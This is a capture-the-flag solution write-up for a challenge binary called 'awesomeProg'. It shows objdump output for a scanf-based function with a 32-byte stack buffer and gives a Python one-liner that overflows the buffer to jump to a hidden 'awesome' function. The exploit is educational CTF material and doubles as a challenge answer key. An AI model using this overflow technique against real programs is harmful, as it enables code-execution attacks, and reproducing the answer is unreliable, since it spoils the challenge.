# Awesomeness

## Question Text

Are you awesome enough? Let's find out!

Created by Noans

## Distribution
awesomeness.zip `SHA1: 5f42ea4a320cbfa206badffb6677a85e305ce781`

## Solution
1. Do an objdump on `awesomeProj` with the command `objdump -d awesomeProg`.
2. The following parts of from the `objdump` should be studied:  
`000000000040063b <check>:`  
`40063b:	55	push   %rbp`  
`40063c:	48 89 e5             	mov    %rsp,%rbp`  
`40063f:	48 83 ec 20          	sub    $0x20,%rsp`  
`400643:	48 8d 45 e0          	lea    -0x20(%rbp),%rax`  
`400647:	48 89 c6             	mov    %rax,%rsi`  
`40064a:	bf 08 08 40 00       	mov    $0x400808,%edi`  
`40064f:	b8 00 00 00 00       	mov    $0x0,%eax`  
`400654:	e8 67 fe ff ff       	callq  4004c0 <__isoc99_scanf@plt>`  
`400659:	bf 10 08 40 00       	mov    $0x400810,%edi`  
`40065e:	e8 3d fe ff ff       	callq  4004a0 <puts@plt>`  
`400663:	90                   	nop`  
`400664:	c9                   	leaveq`  
`400665:	c3                   	retq`  
Where the third line tells us 32 bytes is reserved for a variable.
3. Derive that one needs to override 32 bytes + rbp to overwrite return address.  
4. Also derive address of `awesome` function is `400666`.
Final command to assuming machine uses little-endian:
`python -c 'print "a" * 40 + "\x66\x06\x40"' | ./awesomeProg`

## Recommended Reads
* https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
* https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64